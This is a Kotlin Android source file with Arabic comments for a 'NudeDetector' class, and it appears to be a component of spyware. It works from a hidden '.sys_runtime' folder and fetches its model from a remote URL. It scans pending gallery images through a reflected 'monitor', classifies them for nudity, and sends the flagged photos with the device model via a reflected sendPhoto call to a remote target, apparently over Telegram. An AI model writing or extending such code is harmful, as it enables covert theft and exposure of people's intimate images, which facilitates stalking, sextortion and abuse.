package com.example.app

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import org.tensorflow.lite.Interpreter
import java.io.File
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

/**
 * فئة كاشف المحتوى (NudeDetector) باستخدام TensorFlow Lite و SQLite على أجهزة Android.
 * هذه الفئة هي بديل nude_detector.py مع تحسينات الأداء والتوافق مع Android.
 *
 * تعتمد على تحميل نموذج AI (engine_v2.tflite) ديناميكياً من الإنترنت عبر FileDownloader
 * في حال عدم وجوده محلياً، مع إعادة محاولة تلقائية عند الفشل.
 *
 * ✅ تم إصلاح مشكلة runBlocking في دالة analyze باستخدام قفل متزامن عادي.
 * ✅ تم إصلاح دالة close() لتكون معلقة (suspend) وتجنب runBlocking.
 * ✅ تم إضافة معالجة OutOfMemoryError عبر تقليل حجم الصورة باستخدام inSampleSize.
 * ✅ تم إضافة التحقق من monitor != null في دالة worker.
 * ✅ تم إصلاح دالة analyze لتجنب NPE عند استخدام interpreter.
 * ✅ تم استبدال invokeMethod(monitor, "getMediaScanner") بـ getModuleComponent للوصول إلى الحقل مباشرة.
 * ✅ تم جعل الدالتين ensureModelReady و loadEngineForever قابلة للاستدعاء من خارج الفئة (internal) لتحديث النموذج عبر Telegram.
 * ✅ تم إزالة فك تشفير Base64 اليدوي من ensureModelReady والاعتماد على FileDownloader الذي يدعم isBase64.
 * ✅ تم تأمين إغلاق الـ Interpreter القديم في loadEngineForever باستخدام modelMutex.withLock.
 */
class NudeDetector(
    context: Context,
    private val monitor: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var interpreter: Interpreter? = null
    private val modelMutex = Mutex()
    private val activeMutex = Mutex()

    // ✅ قفل متزامن لاستدعاءات interpreter.run لتجنب استخدام runBlocking
    private val interpreterLock = Any()

    private val isScannerActive = AtomicBoolean(false)
    private val isLoadingEngine = AtomicBoolean(false)
    private val isDownloadingModel = AtomicBoolean(false)

    private var lastRunTime: Long = 0
    private var loadErrorCount = 0
    private val maxLoadErrors = 10

    private var inputSizeX = 224
    private var inputSizeY = 224
    var modelPath: String? = null   // جعلته var وقابل للوصول من الخارج

    // ========== المسارات والملفات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val modelsDir: File by lazy {
        File(runtimeDir, "models").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "nude_config.json")
    }

    private val logFile: File by lazy {
        File(runtimeDir, "n.log")
    }

    private val dbHelper: NudeCacheDbHelper by lazy {
        NudeCacheDbHelper(appContext ?: context)
    }

    // ========== مدير التحميل ==========
    private val fileDownloader: FileDownloader by lazy {
        FileDownloader(appContext ?: context)
    }

    // ========== الإعدادات (بديل _config) ==========
    private val configMap = mutableMapOf<String, Any>(
        "model_min_size" to 5_000_000L,          // 5 ميجابايت
        "max_file_size" to 8 * 1024 * 1024L,     // 8 ميجابايت
        "min_image_size" to 50,
        "max_image_size" to 10000,
        "scan_interval" to 1800L,                // 30 دقيقة
        "nude_threshold" to 0.85f,
        "questionable_threshold" to 0.45f,
        "aspect_bonus" to 0.03f,
        "report_enabled" to true,
        "cache_ttl" to 30 * 86400L               // 30 يومًا
    )

    companion object {
        private const val TAG = "NudeDetector"

        @JvmStatic
        fun create(context: Context, monitor: Any? = null): NudeDetector {
            return NudeDetector(context, monitor)
        }
    }

    init {
        loadConfig()
        // بدء عملية التحقق من النموذج وتحميله في الخلفية
        scope.launch {
            val ready = ensureModelReady()
            if (ready) {
                modelPath = File(modelsDir, "engine_v2.tflite").absolutePath
                loadEngineForever()
            } else {
                writeLog("⚠️ Model could not be loaded. AI features will be disabled.")
            }
        }
    }

    // ============================================================
    //  إدارة التكوين والملفات (بديل _load_config و _save_config)
    // ============================================================

    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                configMap[key] = json.get(key)
            }
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig(): Boolean {
        return try {
            val json = JSONObject(configMap as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
            true
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  التأكد من جاهزية النموذج (مع التحميل الديناميكي) - أصبحت internal للاستدعاء من TelegramUi
    // ============================================================

    /**
     * التأكد من وجود النموذج وسلامته.
     * يحاول أولاً النسخ من assets، ثم التحميل من الإنترنت عبر FileDownloader.
     * يعيد true إذا تم تحضير النموذج بنجاح، false في حالة الفشل.
     */
    internal suspend fun ensureModelReady(): Boolean {
        val modelFile = File(modelsDir, "engine_v2.tflite")
        val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L

        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي، اعتبره جاهزاً
        if (modelFile.exists() && modelFile.length() >= minSize) {
            writeLog("✅ Model already exists at ${modelFile.absolutePath} (${modelFile.length()} bytes)")
            return true
        }

        // 2. محاولة النسخ من assets (اختياري، يمكن تعطيلها لتقليل الاعتماد على الملفات المضمنة)
        writeLog("📂 Attempting to copy model from assets (optional)...")
        if (copyModelFromAssets(modelFile)) {
            if (modelFile.exists() && modelFile.length() >= minSize) {
                writeLog("✅ Model copied from assets successfully (${modelFile.length()} bytes)")
                return true
            }
        }

        // 3. إذا فشل النسخ من assets، نبدأ التحميل من الإنترنت
        writeLog("🌐 Model not found in assets (or copy failed). Downloading from internet...")

        // قراءة ملف index.json من assets للحصول على رابط التحميل وحجم الملف ونوعه
        val indexJson = try {
            appContext?.assets?.open("index.json")?.bufferedReader()?.use { it.readText() }
        } catch (e: Exception) {
            writeLog("❌ Failed to read index.json: ${e.message}")
            null
        }

        if (indexJson.isNullOrEmpty()) {
            writeLog("❌ index.json is empty or missing. Cannot download model.")
            return false
        }

        val json = JSONObject(indexJson)
        val assetsArray = json.getJSONArray("assets")
        if (assetsArray.length() == 0) {
            writeLog("❌ No assets found in index.json")
            return false
        }

        val asset = assetsArray.getJSONObject(0)
        val url = asset.getString("url")
        val expectedSize = asset.optLong("expected_size", 0)
        val isBase64 = asset.optBoolean("is_base64", false)

        if (url.isEmpty()) {
            writeLog("❌ Download URL is empty in index.json")
            return false
        }

        writeLog("📥 Download URL: $url")
        writeLog("📦 isBase64: $isBase64")
        if (expectedSize > 0) {
            writeLog("📦 Expected size: ${expectedSize / (1024 * 1024)} MB")
        } else {
            writeLog("⚠️ Expected size not specified, will check file integrity after download.")
        }

        isDownloadingModel.set(true)
        val success = try {
            fileDownloader.downloadModelWithRetry(
                url = url,
                destinationFile = modelFile,
                expectedSize = expectedSize,
                isBase64 = isBase64,
                maxRetries = 3
            )
        } finally {
            isDownloadingModel.set(false)
        }

        if (success) {
            writeLog("✅ Model downloaded successfully (${modelFile.length()} bytes)")
            // تحديث الحجم الأدنى في الإعدادات حسب الحجم الفعلي
            configMap["model_min_size"] = modelFile.length()
            saveConfig()
            return true
        } else {
            writeLog("❌ Failed to download model after multiple attempts.")
            return false
        }
    }

    /**
     * نسخ النموذج من مجلد assets إلى المجلد الهدف.
     */
    private fun copyModelFromAssets(destFile: File): Boolean {
        val ctx = appContext ?: return false
        return try {
            ctx.assets.open("engine_v2.tflite").use { input ->
                destFile.parentFile?.mkdirs()
                FileOutputStream(destFile).use { output ->
                    input.copyTo(output)
                }
            }
            true
        } catch (e: Exception) {
            writeLog("Copy from assets failed: ${e.message}")
            false
        }
    }

    // ============================================================
    //  البحث عن النموذج (بديل _find_model) - تم تعديلها لتصبح suspend
    // ✅ إزالة runBlocking واستخدام delay لتجنب ANR
    // ============================================================

    private suspend fun findModel(): String? {
        val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L

        val possiblePaths = arrayOf(
            File(modelsDir, "engine_v2.tflite").absolutePath,
            File(runtimeDir, "engine_v2.tflite").absolutePath,
            File(appContext?.filesDir, "engine_v2.tflite").absolutePath
        )

        for (path in possiblePaths) {
            try {
                val file = File(path)
                if (file.exists() && file.length() >= minSize) {
                    writeLog("✅ Model found at: $path (${file.length() / (1024 * 1024)} MB)")
                    return path
                }
            } catch (e: Exception) {
                writeLog("Error checking path $path: ${e.message}")
            }
        }

        // ✅ إذا كان التحميل جارياً، ننتظر قليلاً ثم نتحقق مرة أخرى
        if (isDownloadingModel.get()) {
            writeLog("⏳ Model download is in progress, waiting...")
            delay(5000) // انتظار 5 ثوانٍ
            // إعادة التحقق بعد الانتظار
            val dest = File(modelsDir, "engine_v2.tflite")
            if (dest.exists() && dest.length() >= minSize) {
                writeLog("✅ Model found after download: ${dest.absolutePath}")
                return dest.absolutePath
            }
        }

        writeLog("❌ Model not found in any expected location.")
        return null
    }

    // ============================================================
    //  تحميل المحرك (بديل _load_engine_forever) - أصبحت internal للاستدعاء من TelegramUi
    // ============================================================

    internal suspend fun loadEngineForever() {
        if (isLoadingEngine.get() || modelPath.isNullOrEmpty()) return

        // محاولة البحث عن النموذج إذا لم يتم تعيين المسار
        if (modelPath.isNullOrEmpty()) {
            modelPath = findModel()
            if (modelPath.isNullOrEmpty()) {
                writeLog("❌ No model found, cannot load engine.")
                return
            }
        }

        val mFile = File(modelPath!!)
        if (!mFile.exists()) {
            writeLog("❌ Model file not found at: $modelPath")
            return
        }

        isLoadingEngine.set(true)
        var attempt = 0
        var waitTime = 3000L
        val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L

        writeLog("🔄 Starting AI engine load attempts from: $modelPath")

        while (loadErrorCount < maxLoadErrors) {
            try {
                // التحقق من صحة الملف
                if (!mFile.exists()) {
                    throw IllegalStateException("Model file disappeared")
                }
                if (mFile.length() < minSize) {
                    throw IllegalStateException("Model size too small: ${mFile.length()} bytes")
                }

                // تحميل النموذج
                val options = Interpreter.Options().apply {
                    setNumThreads(2)
                }

                val newInterpreter = Interpreter(mFile, options)

                // تحديد حجم الإدخال من النموذج
                val inputTensor = newInterpreter.getInputTensor(0)
                val shape = inputTensor.shape()
                if (shape.size >= 3) {
                    inputSizeX = shape[1]
                    inputSizeY = shape[2]
                } else if (shape.size >= 2) {
                    inputSizeX = shape[1]
                    inputSizeY = shape[1]
                }

                // ✅ استبدال المحرك القديم مع إغلاق المحرك السابق بشكل صحيح لمنع تسريب الذاكرة
                modelMutex.withLock {
                    interpreter?.close()  // إغلاق المحرك القديم
                    interpreter = newInterpreter
                }

                writeLog("✅ AI Engine loaded successfully (input size: ${inputSizeX}x${inputSizeY})")
                isLoadingEngine.set(false)
                loadErrorCount = 0
                return

            } catch (e: Exception) {
                loadErrorCount++
                writeLog("Load attempt ${attempt + 1} failed: ${e.message}")
                modelMutex.withLock {
                    interpreter?.close()  // إغلاق المحرك في حالة الفشل
                    interpreter = null
                }
                waitTime = minOf(waitTime + 2000L, 60000L)
            }

            attempt++
            delay(waitTime)
        }

        writeLog("❌ Max load attempts reached. AI permanently disabled.")
        isLoadingEngine.set(false)
    }

    // ============================================================
    //  حالات النموذج (بديل is_ready و is_loading)
    // ============================================================

    fun isReady(): Boolean {
        return interpreter != null
    }

    fun isLoading(): Boolean {
        return isLoadingEngine.get()
    }

    // ============================================================
    //  حساب معامل التصغير (inSampleSize) المناسب لتجنب OutOfMemoryError
    // ============================================================

    /**
     * حساب معامل التصغير المطلوب لجعل الصورة قريبة من الأبعاد المستهدفة.
     * @param options خيارات Bitmap تحتوي على الأبعاد الأصلية
     * @param reqWidth العرض المطلوب بعد التصغير
     * @param reqHeight الارتفاع المطلوب بعد التصغير
     * @return معامل التصغير (inSampleSize)
     */
    private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
        // الأبعاد الأصلية
        val height = options.outHeight
        val width = options.outWidth
        var inSampleSize = 1

        if (height > reqHeight || width > reqWidth) {
            val halfHeight = height / 2
            val halfWidth = width / 2

            // حساب معامل التصغير مع الحفاظ على نسبة الأبعاد
            while (halfHeight / inSampleSize >= reqHeight && halfWidth / inSampleSize >= reqWidth) {
                inSampleSize *= 2
            }
        }

        // الحد الأقصى للتصغير هو 8x لتجنب فقدان الجودة المفرط
        return inSampleSize.coerceAtMost(8)
    }

    // ============================================================
    //  تحليل الصورة (بديل analyze)
    // ✅ تم إصلاح مشكلة runBlocking باستخدام قفل متزامن عادي
    // ✅ تم إضافة تحجيم الصورة باستخدام inSampleSize لتجنب OutOfMemoryError
    // ✅ تم إضافة التحقق من interpreter != null داخل القفل لتجنب NPE
    // ============================================================

    fun analyze(path: String): Float {
        if (!isReady()) {
            // محاولة إعادة تحميل المحرك إذا لم يكن جاهزاً
            if (!isLoadingEngine.get() && loadErrorCount < maxLoadErrors) {
                scope.launch {
                    loadEngineForever()
                }
            }
            return 0.0f
        }

        if (path.isBlank()) return 0.0f

        val file = File(path)
        if (!file.exists()) return 0.0f

        // التحقق من حجم الملف
        val fileSize = file.length()
        val maxFileSize = (configMap["max_file_size"] as? Number)?.toLong() ?: (8 * 1024 * 1024L)
        if (fileSize < 1000 || fileSize > maxFileSize) {
            return 0.0f
        }

        // التحقق من الامتداد
        val ext = file.extension.lowercase(Locale.ROOT)
        if (ext !in arrayOf("png", "jpg", "jpeg", "webp", "bmp", "gif", "tiff")) {
            return 0.0f
        }

        return try {
            // ✅ قراءة أبعاد الصورة دون تحميلها بالكامل
            val options = BitmapFactory.Options().apply {
                inJustDecodeBounds = true
            }
            BitmapFactory.decodeFile(path, options)

            val w = options.outHeight
            val h = options.outWidth

            val minSz = (configMap["min_image_size"] as? Number)?.toInt() ?: 50
            val maxSz = (configMap["max_image_size"] as? Number)?.toInt() ?: 10000

            if (w < minSz || h < minSz || w > maxSz || h > maxSz) {
                return 0.0f
            }

            // ✅ حساب معامل التصغير المناسب لتجنب OutOfMemoryError
            val sampleSize = calculateInSampleSize(options, inputSizeX, inputSizeY)

            // ✅ تحميل الصورة بحجم مخفض
            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = sampleSize
                inPreferredConfig = Bitmap.Config.ARGB_8888
                inJustDecodeBounds = false
            }
            val origBitmap = BitmapFactory.decodeFile(path, decodeOptions) ?: return 0.0f

            // تحجيم الصورة إلى الحجم المطلوب للمدخلات
            val scaledBitmap = Bitmap.createScaledBitmap(origBitmap, inputSizeX, inputSizeY, true)
            if (origBitmap != scaledBitmap) {
                origBitmap.recycle()
            }

            // مكافأة الصور العمودية (بعد التحجيم)
            val aspectBonus = if (h > w * 1.2f) {
                (configMap["aspect_bonus"] as? Number)?.toFloat() ?: 0.03f
            } else 0.0f

            // تحويل إلى ByteBuffer
            val imgData = convertBitmapToByteBuffer(scaledBitmap)
            scaledBitmap.recycle()

            // ✅ تنفيذ الاستدلال باستخدام قفل متزامن عادي بدلاً من runBlocking
            // ✅ التحقق من interpreter != null داخل القفل لتجنب NPE
            val output = Array(1) { FloatArray(2) }
            synchronized(interpreterLock) {
                val interpreterLocal = interpreter
                if (interpreterLocal == null) return 0.0f
                interpreterLocal.run(imgData, output)
            }

            val out = output[0]
            var prob = if (out.size > 1) {
                out[1] / (out[0] + out[1] + 1e-8f)
            } else {
                out[0]
            }

            prob = minOf(maxOf(prob, 0.0f), 1.0f)
            prob = minOf(prob + aspectBonus, 1.0f)

            prob

        } catch (e: Exception) {
            writeLog("Analyze error ($path): ${e.message}")
            0.0f
        }
    }

    private fun convertBitmapToByteBuffer(bitmap: Bitmap): ByteBuffer {
        val byteBuffer = ByteBuffer.allocateDirect(4 * inputSizeX * inputSizeY * 3)
        byteBuffer.order(ByteOrder.nativeOrder())

        val intValues = IntArray(inputSizeX * inputSizeY)
        bitmap.getPixels(intValues, 0, bitmap.width, 0, 0, bitmap.width, bitmap.height)

        var pixel = 0
        for (i in 0 until inputSizeX) {
            for (j in 0 until inputSizeY) {
                val value = intValues[pixel++]
                byteBuffer.putFloat(((value shr 16) and 0xFF) / 255.0f)
                byteBuffer.putFloat(((value shr 8) and 0xFF) / 255.0f)
                byteBuffer.putFloat((value and 0xFF) / 255.0f)
            }
        }

        return byteBuffer
    }

    // ============================================================
    //  المسح الدوري (بديل scan و _worker)
    // ============================================================

    fun scan(): Boolean {
        if (isScannerActive.get()) return false

        if (!isReady()) {
            if (!isLoadingEngine.get()) {
                scope.launch {
                    loadEngineForever()
                }
            }
            return false
        }

        val now = System.currentTimeMillis() / 1000
        val scanInterval = (configMap["scan_interval"] as? Number)?.toLong() ?: 1800L

        if ((now - lastRunTime) < scanInterval) {
            return false
        }

        lastRunTime = now
        scope.launch {
            worker()
        }
        return true
    }

    private suspend fun worker() {
        // ✅ التحقق من وجود monitor قبل الاستخدام
        if (monitor == null) {
            writeLog("Monitor is null, cannot get mediaScanner")
            return
        }

        activeMutex.withLock {
            if (isScannerActive.get()) return
            isScannerActive.set(true)
        }

        try {
            // ✅ استخدام getModuleComponent بدلاً من invokeMethod للوصول إلى الحقل مباشرة
            val mediaScanner = getModuleComponent(monitor, "mediaScanner")
            if (mediaScanner == null) {
                writeLog("MediaScanner component not available, skipping scan")
                return
            }

            @Suppress("UNCHECKED_CAST")
            val items = invokeMethod(mediaScanner, "getGalleryByCategory", "pending", 30) as? List<Map<String, Any>>
            if (items.isNullOrEmpty()) {
                writeLog("No pending items to scan")
                return
            }

            val nudeThreshold = (configMap["nude_threshold"] as? Number)?.toFloat() ?: 0.85f
            val questionableThreshold = (configMap["questionable_threshold"] as? Number)?.toFloat() ?: 0.45f

            var processed = 0
            var detected = 0

            for (item in items) {
                try {
                    val path = item["path"] as? String ?: continue
                    val hash = item["hash"] as? String ?: continue

                    if (!File(path).exists()) continue
                    if (isCached(hash)) continue

                    val prob = analyze(path)
                    processed++

                    when {
                        prob > nudeThreshold -> {
                            invokeMethod(mediaScanner, "updateCategory", hash, "nude", prob)
                            detected++

                            val reportEnabled = configMap["report_enabled"] as? Boolean ?: true
                            if (reportEnabled) {
                                val label = item["label"] as? String ?: "??"
                                report(path, label, prob)
                            }
                        }
                        prob > questionableThreshold -> {
                            invokeMethod(mediaScanner, "updateCategory", hash, "questionable", prob)
                        }
                        else -> {
                            invokeMethod(mediaScanner, "updateCategory", hash, "normal", prob)
                        }
                    }

                    markCached(hash, path)

                    if (processed % 3 == 0) {
                        delay(300L)
                    }
                } catch (e: Exception) {
                    writeLog("Worker item error: ${e.message}")
                }
            }

            if (detected > 0) {
                writeLog("✅ Detected $detected sensitive images")
            } else {
                writeLog("Scan completed, no sensitive images detected")
            }

        } catch (e: Exception) {
            writeLog("Worker error: ${e.message}")
        } finally {
            isScannerActive.set(false)
        }
    }

    // ============================================================
    //  إدارة الكاش (بديل _is_cached و _mark_cached)
    // ============================================================

    private fun isCached(hash: String): Boolean {
        if (hash.isBlank()) return false

        return try {
            val db = dbHelper.readableDatabase
            val cursor = db.query(
                "scan_logs",
                arrayOf("1"),
                "h = ?",
                arrayOf(hash),
                null, null, null
            )
            val exists = cursor.count > 0
            cursor.close()
            exists
        } catch (e: Exception) {
            writeLog("Cache check error: ${e.message}")
            false
        }
    }

    private fun markCached(hash: String, path: String = "") {
        if (hash.isBlank()) return

        try {
            val db = dbHelper.writableDatabase
            val values = ContentValues().apply {
                put("h", hash)
                put("ts", System.currentTimeMillis() / 1000)
                put("path", path)
            }
            db.insertWithOnConflict("scan_logs", null, values, SQLiteDatabase.CONFLICT_REPLACE)
        } catch (e: Exception) {
            writeLog("Mark cached error: ${e.message}")
        }
    }

    // ============================================================
    //  إرسال التقارير (بديل _report)
    // ============================================================

    private fun report(path: String, label: String, confidence: Float) {
        if (monitor == null || !File(path).exists()) return

        val ui = invokeMethod(monitor, "getUi") ?: return
        val target = invokeMethod(ui, "getDat") ?: invokeMethod(ui, "getCtrl") ?: return

        val deviceModel = invokeMethod(monitor, "getDeviceModel") as? String ?: "?"
        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())

        val caption = """
            🔞 **AI Detection**
            📱 Device: `$deviceModel`
            🏷️ Label: `$label`
            🎯 Confidence: `${(confidence * 100).toInt()}%`
            ⏰ Time: `$timeStr`
        """.trimIndent()

        try {
            invokeMethod(ui, "sendPhoto", target, path, caption)
        } catch (e: Exception) {
            writeLog("Report send error: ${e.message}")
        }
    }

    // ============================================================
    //  أدوات مساعدة (بديل clear_cache و get_stats)
    // ============================================================

    fun clearCache(): Boolean {
        return try {
            val db = dbHelper.writableDatabase
            db.delete("scan_logs", null, null)
            db.execSQL("VACUUM")
            true
        } catch (e: Exception) {
            writeLog("Clear cache error: ${e.message}")
            false
        }
    }

    fun getStats(): Map<String, Any?> {
        return try {
            val db = dbHelper.readableDatabase

            var total = 0
            var minTs: Long? = null
            var maxTs: Long? = null

            // عدد السجلات
            val cursorTotal = db.rawQuery("SELECT COUNT(*) FROM scan_logs", null)
            if (cursorTotal.moveToFirst()) {
                total = cursorTotal.getInt(0)
            }
            cursorTotal.close()

            // أقدم وأحدث سجل
            val cursorTs = db.rawQuery("SELECT MIN(ts), MAX(ts) FROM scan_logs", null)
            if (cursorTs.moveToFirst()) {
                if (!cursorTs.isNull(0)) minTs = cursorTs.getLong(0)
                if (!cursorTs.isNull(1)) maxTs = cursorTs.getLong(1)
            }
            cursorTs.close()

            mapOf(
                "total" to total,
                "oldest" to minTs?.let {
                    SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000))
                },
                "newest" to maxTs?.let {
                    SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000))
                },
                "model_ready" to isReady(),
                "model_loading" to isLoadingEngine.get(),
                "active" to isScannerActive.get(),
                "model_path" to modelPath,
                "input_size" to "${inputSizeX}x${inputSizeY}"
            )
        } catch (e: Exception) {
            writeLog("Stats error: ${e.message}")
            mapOf("total" to 0)
        }
    }

    // ============================================================
    //  إغلاق الموارد (تم إصلاح مشكلة runBlocking)
    // ✅ تم جعل الدالة معلقة (suspend) واستخدام withContext
    // ============================================================

    /**
     * إغلاق المحرك وتحرير الموارد المستخدمة.
     * يجب استدعاؤها عند تدمير الكائن لتجنب تسرب الذاكرة.
     * تم تعديلها لتكون معلقة (suspend) لتجنب حظر الخيط الرئيسي.
     */
    suspend fun close() {
        withContext(Dispatchers.IO) {
            modelMutex.withLock {
                interpreter?.close()
                interpreter = null
            }
        }
        // إلغاء جميع المهام المعلقة في CoroutineScope
        scope.cancel()
        writeLog("NudeDetector closed successfully.")
    }

    // ============================================================
    //  دوال المساعدة والانعكاس (Reflection)
    // ============================================================

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val logText = "[$timestamp] [INFO] $message\n"
            logFile.appendText(logText, Charsets.UTF_8)
        } catch (_: Exception) {
            // تجاهل أخطاء التسجيل في الملف
        }
    }

    /**
     * استدعاء دالة على كائن عبر الانعكاس (بديل عن استدعاء الدوال مباشرة في Python)
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        return try {
            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
                ?: return null

            method.isAccessible = true
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }

    /**
     * الحصول على قيمة حقل (Field) من كائن عبر الانعكاس.
     * تستخدم للوصول إلى المكونات مثل mediaScanner بدلاً من استدعاء دوال.
     */
    private fun getModuleComponent(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (e: Exception) {
            writeLog("Get field error ($fieldName): ${e.message}")
            null
        }
    }

    // ============================================================
    //  مساعد قاعدة البيانات (SQLiteOpenHelper)
    // ============================================================

    private inner class NudeCacheDbHelper(context: Context) :
        SQLiteOpenHelper(
            context,
            File(runtimeDir, "n_cache.db").absolutePath,
            null,
            1
        ) {

        override fun onCreate(db: SQLiteDatabase) {
            db.execSQL(
                """
                CREATE TABLE IF NOT EXISTS scan_logs (
                    h TEXT PRIMARY KEY,
                    ts INTEGER,
                    path TEXT
                )
                """.trimIndent()
            )
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)")

            // تنظيف السجلات القديمة حسب TTL
            val ttl = (configMap["cache_ttl"] as? Number)?.toLong() ?: (30 * 86400L)
            val oldTs = (System.currentTimeMillis() / 1000) - ttl
            db.execSQL("DELETE FROM scan_logs WHERE ts < $oldTs")
        }

        override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
            db.execSQL("DROP TABLE IF EXISTS scan_logs")
            onCreate(db)
        }
    }
}
